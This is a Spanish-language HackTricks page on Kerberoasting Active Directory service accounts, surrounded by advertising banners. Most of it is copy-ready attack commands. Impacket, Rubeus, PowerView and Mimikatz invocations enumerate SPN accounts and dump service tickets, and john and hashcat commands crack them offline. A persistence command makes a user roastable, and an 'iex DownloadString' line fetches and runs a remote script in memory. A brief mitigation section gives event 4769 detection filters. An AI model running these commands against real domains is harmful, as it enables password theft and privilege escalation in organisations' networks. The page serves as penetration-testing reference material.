# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias **más avanzadas** del mundo.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking de AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Kerberoast

El objetivo de **Kerberoasting** es recolectar **tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario** en AD, no cuentas de computadora. Por lo tanto, **parte** de estos tickets TGS **están cifrados** con **claves** derivadas de contraseñas de usuario. Como consecuencia, sus credenciales podrían ser **crackeadas offline**.\
Puedes saber que una **cuenta de usuario** se está utilizando como un **servicio** porque la propiedad **"ServicePrincipalName"** es **no nula**.

Por lo tanto, para realizar Kerberoasting, solo se necesita una cuenta de dominio que pueda solicitar TGSs, lo cual es posible para cualquiera ya que no se requieren privilegios especiales.

**Necesitas credenciales válidas dentro del dominio.**

### **Ataque**

{% hint style="warning" %}
Las **herramientas de Kerberoasting** típicamente solicitan **cifrado `RC4`** al realizar el ataque e iniciar solicitudes de TGS-REQ. Esto se debe a que **RC4 es** [**más débil**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) y más fácil de crackear offline usando herramientas como Hashcat que otros algoritmos de cifrado como AES-128 y AES-256.\
Los hashes de RC4 (tipo 23) comienzan con **`$krb5tgs$23$*`** mientras que los de AES-256(tipo 18) comienzan con **`$krb5tgs$18$*`**`.`
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Herramientas multifuncionales que incluyen un volcado de usuarios susceptibles a Kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Enumerar usuarios susceptibles a Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Técnica 1: Solicitar TGS y volcarlo desde la memoria**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Técnica 2: Herramientas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Cuando se solicita un TGS, se genera el evento de Windows `4769 - Se solicitó un ticket de servicio Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las herramientas comunitarias **más avanzadas** del mundo.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistencia

Si tienes **suficientes permisos** sobre un usuario puedes **hacerlo susceptible a kerberoast**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Puedes encontrar **herramientas** útiles para ataques de **kerberoast** aquí: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si encuentras este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** es debido a tu hora local, necesitas sincronizar el host con el DC. Hay algunas opciones:

* `ntpdate <IP del DC>` - Obsoleto a partir de Ubuntu 16.04
* `rdate -n <IP del DC>`

### Mitigación

Kerberoast es muy sigiloso si es explotable

* ID del Evento de Seguridad 4769 – Se solicitó un ticket de Kerberos
* Dado que el 4769 es muy frecuente, filtremos los resultados:
* El nombre del servicio no debe ser krbtgt
* El nombre del servicio no debe terminar con $ (para filtrar cuentas de máquinas utilizadas para servicios)
* El nombre de la cuenta no debe ser maquina@dominio (para filtrar solicitudes de máquinas)
* El código de fallo es '0x0' (para filtrar fallos, 0x0 es éxito)
* Lo más importante, el tipo de cifrado del ticket es 0x17
* Mitigación:
* Las contraseñas de las Cuentas de Servicio deben ser difíciles de adivinar (más de 25 caracteres)
* Utilizar Cuentas de Servicio Gestionadas (cambio automático de contraseña periódicamente y gestión delegada de SPN)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## Kerberoast sin cuenta de dominio

En septiembre de 2022 se descubrió una vulnerabilidad por [Charlie Clark](https://exploit.ph/), los ST (Service Tickets) pueden obtenerse a través de una solicitud KRB\_AS\_REQ sin necesidad de controlar ninguna cuenta de Active Directory. Si un principal puede autenticarse sin pre-autenticación (como en el ataque AS-REP Roasting), es posible utilizarlo para lanzar una solicitud **KRB\_AS\_REQ** y engañar a la solicitud para que pida un **ST** en lugar de un **TGT encriptado**, modificando el atributo **sname** en la parte req-body de la solicitud.

La técnica está completamente explicada en este artículo: [Publicación del blog de Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Debes proporcionar una lista de usuarios porque no tenemos una cuenta válida para consultar el LDAP utilizando esta técnica.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py del PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus desde PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**Más información sobre Kerberoasting en ired.team** [**aquí**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**y** [**aquí**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

<details>

<summary><strong>Aprende a hackear AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al grupo de** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) o al grupo de [**telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas**.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
